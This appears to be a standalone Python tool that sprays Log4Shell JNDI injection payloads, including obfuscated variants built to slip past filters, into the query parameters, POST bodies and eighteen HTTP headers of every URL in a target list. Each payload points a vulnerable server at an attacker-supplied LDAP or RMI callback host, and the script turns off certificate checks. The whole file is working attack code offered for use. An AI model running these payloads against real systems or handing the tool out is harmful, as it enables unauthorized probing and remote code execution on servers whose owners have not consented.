import sys
from sys import argv
import requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor


disable_warnings()

proxies = {"http": "http://127.0.0.1:1234", "https": "http://127.0.0.1:1234"}

raw_payloads = [
    "${jndi:ldap://",
    "${jndi:rmi://",
    "${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://",
    "${${::-j}ndi:rmi://",
    "${${lower:jndi}: ${lower:rmi}://",
    "${${lower: ${lower:jndi}}: ${lower:rmi}://",
    "${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://",
    "${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://",
    "${${lower:jnd}${upper:i}: ${lower:ldap}://",
]


def httpHeaders(payload):
    headers = ["User-Agent", "Referer", "poc", "Authentication", "X-Forwarded-For",
               "X-Client-IP", "X-Remote-IP", "X-Remote-Addr", "X-Originating-IP",
               "X-Real-IP", "CF-Connecting_IP", "True-Client-IP", "Forwarded",
               "Client-IP", "Contact", "X-Wap-Profile", "X-Api-Version", "Originating-IP"]
    return {header: payload for header in headers}


def targetRequest(target, targetId, interactionUrl):
    try:
        print(f"[{targetId}] Testing asset: {target}")

        for raw_payload in raw_payloads:
            payload = f"{raw_payload}{targetId}.{interactionUrl}/poc{targetId}{'}'}"
            params = {"poc": payload}
            headers = httpHeaders(payload)
            target = target.strip()

            requests.get(
                target,
                headers=headers,
                params=params,
                verify=False,
              #  proxies=proxies,
                timeout=10,
                allow_redirects=False,
            )

            requests.post(
                target,
                headers=headers,
                data={'poc': payload},
                verify=False,
               # proxies=proxies,
                timeout=10,
                allow_redirects=False,
            )
    except Exception as e:
        print(e)
        pass


def execute(targetsList, interactionUrl):
    threads = []
    targetId = 0
    with ThreadPoolExecutor(max_workers=1) as executor:
        for target in targetsList:
            targetId += 1
            threads.append(executor.submit(
                targetRequest, target, targetId, interactionUrl))


def main():
    pathToTargetFile = argv[1]
    interactionUrl = argv[2]
    targetsFile = open(pathToTargetFile, "r")
    targetsList = targetsFile.readlines()
    execute(targetsList, interactionUrl)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("""
              Error: Two arguments required.
              
              Usage: python3 shellingtonmcriceface_bypass.py <targetsFile> <interactionUrl>
              """)
    else:
        main()
